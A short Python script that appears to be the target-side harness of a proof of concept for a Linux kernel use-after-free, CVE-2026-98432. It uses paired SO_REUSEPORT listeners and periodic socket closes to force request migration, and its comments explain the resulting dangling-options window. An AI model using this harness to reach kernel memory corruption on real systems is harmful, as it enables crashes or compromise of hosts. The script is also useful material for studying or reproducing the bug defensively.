import socket, threading, time
# CVE-2026-98432 mode-2 target service: SO_REUSEPORT listener pair.
# Worker A: listen with a big backlog but NEVER accept -> half-open requests
#   pile up pending; every ~8s it closes and rebinds -> the kernel migrates
#   its pending reqs to worker B (inet_reqsk_clone SHARES ireq_opt, the
#   original is freed -> the clone's options dangle ~1s = the UAF window).
# Worker B: accepts normally (keeps the group alive as the migration target).
# Requires: sysctl -w net.ipv4.tcp_migrate_req=1
PORT = 9800
def worker_a():
    while True:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        s.bind(("0.0.0.0", PORT))
        s.listen(4096)
        time.sleep(8)
        s.close()          # <- migration trigger
        time.sleep(0.05)
def worker_b():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    s.bind(("0.0.0.0", PORT))
    s.listen(4096)
    while True:
        try:
            c, a = s.accept()
            c.close()
        except OSError:
            pass
threading.Thread(target=worker_a, daemon=True).start()
threading.Thread(target=worker_b, daemon=True).start()
print("reuseport migrating listener on :%d" % PORT, flush=True)
while True:
    time.sleep(3600)
